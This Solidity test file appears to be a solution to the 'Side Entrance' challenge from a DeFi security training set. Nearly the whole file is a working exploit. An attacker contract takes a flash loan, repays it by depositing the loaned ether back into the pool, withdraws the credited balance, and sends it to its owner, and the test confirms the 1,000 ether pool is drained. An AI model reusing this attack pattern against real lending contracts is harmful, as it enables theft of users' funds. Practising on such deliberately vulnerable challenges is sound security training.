// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";
import {Address} from "openzeppelin-contracts/utils/Address.sol";

contract MySideEntrance is IFlashLoanEtherReceiver {
    using Address for address payable;
    SideEntranceLenderPool thePool;
    address owner;

    fallback() external payable {
    }

    constructor(address _poolAddress) {
        thePool = SideEntranceLenderPool(_poolAddress);
        owner = msg.sender;
    }

    function doFlashLoan(uint amount) external {
        require(msg.sender == owner);
        thePool.flashLoan(amount);
        thePool.withdraw();
        payable(msg.sender).sendValue(address(this).balance);
    }

    function execute() external override payable {
        thePool.deposit{value: msg.value}();
    }
}

contract SideEntrance is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/
        vm.startPrank(attacker);
        MySideEntrance mySideEntrace = new MySideEntrance(address(sideEntranceLenderPool));
        mySideEntrace.doFlashLoan(1000 ether);
        vm.stopPrank();
        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}
